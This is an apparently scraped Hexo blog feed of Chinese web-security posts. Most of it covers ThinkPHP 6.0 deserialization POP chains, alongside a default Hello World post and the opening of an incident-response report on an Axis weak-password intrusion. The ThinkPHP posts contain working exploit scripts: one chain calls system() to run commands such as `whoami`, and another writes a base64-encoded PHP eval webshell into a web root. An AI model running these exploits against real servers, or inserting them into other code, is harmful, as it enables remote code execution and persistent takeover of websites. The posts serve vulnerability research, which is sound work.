<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getChangedData</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable language_">$this</span>-&gt;force ? <span class="variable language_">$this</span>-&gt;data : <span class="title function_ invoke__">array_udiff_assoc</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;origin, function (<span class="variable">$a</span>, <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>)) &amp;&amp; <span class="variable">$a</span> !== <span class="variable">$b</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">is_object</span>(<span class="variable">$a</span>) || <span class="variable">$a</span> != <span class="variable">$b</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只读字段不允许更新</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;<span class="keyword">readonly</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$field</span>) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="跟进-checkAllowFields-方法"><a href="#跟进-checkAllowFields-方法" class="headerlink" title="跟进 checkAllowFields() 方法"></a>跟进 checkAllowFields() 方法</h3><p>漏洞利用点存在于 <code>$this-&gt;db()</code> 内部，需要进入 <code>$this-&gt;db()</code>，即 <code>$this-&gt;field</code> 需要为空，<code>$this-&gt;schema</code> 需要为空。<code>$this-&gt;field</code> 及 <code>$this-&gt;schema</code> 默认为空。</p>
<h3 id="跟进-db-方法"><a href="#跟进-db-方法" class="headerlink" title="跟进 db() 方法"></a>跟进 db() 方法</h3><p>已经可以看到字符拼接操作，当一个类对象被当做字符串处理的时候，将会触发该类对象的 <code>__toString()</code> 魔术方法。</p>
<p>目前为止，前半条POP链已经完成，即可以通过字符串拼接去调用 <code>__toString()</code>，所以先总结一下我们需要设置的点：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;lazySave == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;data不为空</span><br><span class="line"><span class="variable language_">$this</span>-&gt;withEvent == <span class="literal">false</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;exists == <span class="literal">true</span> </span><br><span class="line"><span class="variable language_">$this</span>-&gt;force == <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>调用过程如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）——&gt;<span class="title function_ invoke__">toString</span>()</span><br></pre></td></tr></table></figure>

<h3 id="最终利用"><a href="#最终利用" class="headerlink" title="最终利用"></a>最终利用</h3><p>结合 Thinkphp 5.x 的反序列化链，<code>__toString()</code> 部分，即可触发反序列化漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;<span class="title function_ invoke__">updateData</span>()——&gt;<span class="title function_ invoke__">checkAllowFields</span>()——&gt;<span class="title function_ invoke__">db</span>()——&gt;<span class="variable language_">$this</span>-&gt;table . <span class="variable language_">$this</span>-&gt;suffix（字符串拼接）</span><br><span class="line">——&gt;<span class="title function_ invoke__">__toString</span>()--&gt;<span class="title function_ invoke__">toJson</span>()--&gt;<span class="title function_ invoke__">toArray</span>()--&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>)--&gt;<span class="title function_ invoke__">getValue</span>()--&gt;<span class="variable">$closure</span>(<span class="variable">$value</span>, <span class="variable language_">$this</span>-&gt;data)(最终利用点)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-EXP"><a href="#0x04-EXP" class="headerlink" title="0x04-EXP"></a>0x04-EXP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span> &#123;</span><br><span class="line"> <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="title class_">protected</span> $<span class="title class_">withEvent</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$force</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$table</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$data</span> ;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$withAttr</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$lazySave</span>;</span><br><span class="line"> <span class="keyword">private</span> <span class="variable">$exists</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withEvent = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;force = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;pwd&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;withAttr = [<span class="string">&quot;evil_key&quot;</span> =&gt; <span class="string">&quot;system&quot;</span>];</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;lazySave = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;exists = <span class="literal">true</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;table = <span class="variable">$obj</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// echo urlencode(serialize($a));</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05-参考"></a>0x05-参考</h2><p><a href="https://xz.aliyun.com/t/9546#toc-18">https://xz.aliyun.com/t/9546#toc-18</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
        <tag>ThinkPHP</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP6.0.*反序列化漏洞-2</title>
    <url>/2022/03/18/ThinkPHP6-0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-2/</url>
    <content><![CDATA[<h2 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01-搭建环境"></a>0x01-搭建环境</h2><p>详见前文</p>
<h2 id="0x02-利用条件"><a href="#0x02-利用条件" class="headerlink" title="0x02-利用条件"></a>0x02-利用条件</h2><p>详见前文</p>
<h2 id="0x03-知识要点"><a href="#0x03-知识要点" class="headerlink" title="0x03-知识要点"></a>0x03-知识要点</h2><p>官方文档介绍 ThinkPHP 6.* 启动方式是在终端输入 <code>php think run</code>，启动之后会在终端滚动显示应用运行的情况。通过测试，当通过 <code>system</code> 函数在终端下执行如下形式，<code>system([],&quot;`whoami`&quot;)</code>，可正式执行 <code>whoami</code> 函数，这是由于 shell 中的优先级高，所以会先执行 &#96;&#96; 中的内容，再把执行结果拼接成一个新命令，但是实际上system函数是报错的，所以实际环境不一定会显示出执行后的报错信息。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286640471.png"></p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286645101.png"></p>
<h2 id="0x04-构造POP"><a href="#0x04-构造POP" class="headerlink" title="0x04-构造POP"></a>0x04-构造POP</h2><h3 id="搜索-destruct-方法"><a href="#搜索-destruct-方法" class="headerlink" title="搜索 __destruct 方法"></a>搜索 __destruct 方法</h3><p>全文搜索 <code>__destruct</code> ，发现 <code>/vendor/league/flysystem-cached-adapter/src/Storage/AbstractCache.php</code> 存在该方法，尝试从该点出发挖掘反序列化漏洞。根据 <code>__destruct</code> 方法代码可知，当 <code>$this-&gt;autosave= false</code> 的时候，会进入 <code>$this-&gt;save()</code> 方法。</p>
<h3 id="跟进-save-方法"><a href="#跟进-save-方法" class="headerlink" title="跟进 save() 方法"></a>跟进 save() 方法</h3><p>发现没有实现 <code>save()</code> 方法的代码，尝试查找继承了 AbstractCache 并且实现了 save 方法的继承类。找到如下：<code>/vendor/topthink/framework/src/think/filesystem/CacheStore.php</code> ，<code>save()</code> 方法实现如下：</p>
<p><strong>save()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$contents</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getForStorage</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进 <code>getForStorage()</code> ，发现 <code>cleanContents()</code> 方法，跟进 <code>cleanContents()</code> 方法，该代码大概意思就是从<code> $contents[$path]</code> 列表中提取键名与 <code>[&#39;path&#39;, &#39;dirname&#39;, ...]</code> 相同键值对，同时更新 <code>$contents[$path]</code> 的值。未发现可利用方法。<br>返回getForStorage()，接下来的代码是reture一个经过json_encode处理的数组。</p>
<p><strong>getForStorage()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cleaned</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanContents</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>([<span class="variable">$cleaned</span>, <span class="variable">$this</span>-&gt;complete]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>cleanContents()：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$contents</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$cachedProperties</span> = <span class="title function_ invoke__">array_flip</span>([</span><br><span class="line"><span class="string">&#x27;path&#x27;</span>, <span class="string">&#x27;dirname&#x27;</span>, <span class="string">&#x27;basename&#x27;</span>, <span class="string">&#x27;extension&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;size&#x27;</span>, <span class="string">&#x27;mimetype&#x27;</span>, <span class="string">&#x27;visibility&#x27;</span>, <span class="string">&#x27;timestamp&#x27;</span>, <span class="string">&#x27;type&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$contents</span> <span class="keyword">as</span> <span class="variable">$path</span> =&gt; <span class="variable">$object</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$object</span>)) &#123;</span><br><span class="line"><span class="variable">$contents</span>[<span class="variable">$path</span>] = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$object</span>, <span class="variable">$cachedProperties</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回到 <code>save()</code> 方法，继续观察后续代码。发现 <code>$this-&gt;store</code> 可以控制，即我们调用任意类的 set 方法，或者触发任意不存在 save 方法类的 <code>__call</code> 魔术方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br></pre></td></tr></table></figure>

<p>找到<code>/vendor/topthink/framework/src/think/cache/driver/File.php</code></p>
<h3 id="跟进-set-方法"><a href="#跟进-set-方法" class="headerlink" title="跟进 set 方法"></a>跟进 set 方法</h3><p><code>getExpireTime()</code> 方法为获取过期时间。<br><code>getCacheKey()</code> 方法为获取文件存储名字。</p>
<h3 id="跟进serialize-方法"><a href="#跟进serialize-方法" class="headerlink" title="跟进serialize()方法"></a>跟进serialize()方法</h3><p>发现可利用点，<code>$serialize($data)</code>。其中 <code>$serialize</code> 由 <code>$this-&gt;options[&#39;serialize&#39;][0]</code> 控制，<code>$this-&gt;options[&#39;serialize&#39;][0]</code> 可控。<code>$data</code> 的来源为 $<code>contents = $this-&gt;getForStorage() --&gt; set($this-&gt;key, $contents, $this-&gt;expire) --&gt; set($name, $value, $expire = null) --&gt; serialize($value) --&gt; $serialize($data)</code> ，即 <code>$data</code> 源于<code>$this-&gt;getForStorage()</code>。上面已经跟进过 <code>getForStorage()</code> 方法，<code>getForStorage()</code> 方法中的<code>$cleaned</code> 、<code>$this-&gt;complete</code> 均可控，所以返回结果即可以控制。</p>
<p><strong>serialize():</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] ?? <span class="string">&quot;serialize&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286677451.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;complete = <span class="string">&quot;`whoami`&quot;</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span></span><br></pre></td></tr></table></figure>

<p>调用过程如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;\think\cache<span class="title class_">\Driver\File</span>::<span class="title function_ invoke__">set</span>()——&gt;<span class="title function_ invoke__">serialize</span>()--&gt;<span class="variable">$serialize</span>(<span class="variable">$data</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x05-EXP"><a href="#0x05-EXP" class="headerlink" title="0x05-EXP"></a>0x05-EXP</h2><h3 id="EXP-1："><a href="#EXP-1：" class="headerlink" title="EXP_1："></a>EXP_1：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=[<span class="string">&quot;`whoami`&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="EXP-2（文件写入操作，与上面大同小异，不做论述）："><a href="#EXP-2（文件写入操作，与上面大同小异，不做论述）：" class="headerlink" title="EXP_2（文件写入操作，与上面大同小异，不做论述）："></a>EXP_2（文件写入操作，与上面大同小异，不做论述）：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;expire = <span class="number">1</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=<span class="string">&quot;aaaaPD9waHAgZXZhbCgkR0VUWyJjbWQiXSk7Pz4=&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=/var/www/html/thinkphp6.0-dev/public/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = [];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.dazhuanlan.com/naiyouhzu/topics/1541898">https://www.dazhuanlan.com/naiyouhzu/topics/1541898</a></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
        <tag>ThinkPHP</tag>
        <tag>WEB安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/03/18/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>应急响应之axis弱口令入侵</title>
    <url>/2022/03/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8Baxis%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%85%A5%E4%BE%B5/</url>
    <content><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>5月14日晚20点16分，收到客户通知，服务器疑似存在恶意代码。表象为：该服务器从5月12日下午18点左右开始对其他服务器发起暴力破解攻击，包括 SSH、MSSQL 暴力破解活动。</p>
<h2 id="0x02-事件处置"><a href="#0x02-事件处置" class="headerlink" title="0x02 事件处置"></a>0x02 事件处置</h2><h3 id="访谈用户"><a href="#访谈用户" class="headerlink" title="访谈用户"></a>访谈用户</h3><p><strong>访谈内容：</strong></p>
<ol>
<li>异常服务器基本信息，包括IP、用途、中间件、操作系统等？</li>
<li>几时出现异常现场？</li>
<li>异常情况是什么？</li>
<li>遭受异常服务器攻击的受害者IP信息？</li>
</ol>
<h3 id="网络连接分析"><a href="#网络连接分析" class="headerlink" title="网络连接分析"></a>网络连接分析</h3><p>根据用户描述可知，异常服务器对受害者主机发起 SSH、MSSQL 暴力破解，在异常主机输入命令：netstat -anplt | grep 1433，发现存在多条目的端口为 1433 的网络连接信息，目的IP与受害者IP信息一致，程序 PID 为 5033，对应程序为 JAVA</p>
<h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>ps -aux | grep 5033 对应为 WEB 服务，猜测攻击者通过类似reGeorg 等工具代理流量，然后在本地发起暴力破解攻击。</p>
<h3 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h3><p><code>find  web目录路径 -ctime（-mtime） -7  -type f</code> ，查找7日内新增、改变的文件并进行分析。发现多个文件，涉及类型有 aar 包，冰蝎木马，reGeorg 流量代理工具等。</p>
